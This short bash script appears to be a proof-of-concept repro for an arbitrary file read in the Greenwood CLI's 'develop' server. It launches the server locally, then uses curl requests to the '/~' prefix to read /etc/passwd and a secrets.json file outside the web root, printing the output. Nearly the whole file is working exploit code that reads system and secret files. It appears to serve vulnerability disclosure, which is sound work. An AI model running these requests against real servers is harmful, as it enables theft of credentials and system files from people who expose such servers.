#!/usr/bin/env bash
# Repro: arbitrary file read on `greenwood develop` via the `/~` prefix.
# Prereq: run `yarn install` at the repo root first (provides CLI deps incl. urlpattern-polyfill).
# Requires Node >= 22.18.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$HERE/../.." && pwd)"
CLI="$REPO_ROOT/packages/cli/src/bin.js"
cd "$HERE/fixture"

node "$CLI" develop > /tmp/gwd-repro-dev.log 2>&1 &
SPID=$!
trap 'kill $SPID 2>/dev/null' EXIT
for i in $(seq 1 40); do curl -s -o /dev/null http://localhost:1984/ && break; sleep 0.5; done

echo "### 1) baseline home page"
curl -s -o /dev/null -w "  status=%{http_code}\n" http://localhost:1984/

echo "### 2) EXPECT 404, GOT 200: read /etc/passwd via /~ (no .., no extension)"
curl -s --path-as-is -w "\n  status=%{http_code}\n" 'http://localhost:1984/~/etc/passwd' | head -6

echo "### 3) read project secrets.json (outside web root) via /~<abs-path>"
curl -s --path-as-is -w "\n  status=%{http_code}\n" "http://localhost:1984/~$HERE/fixture/secrets.json"
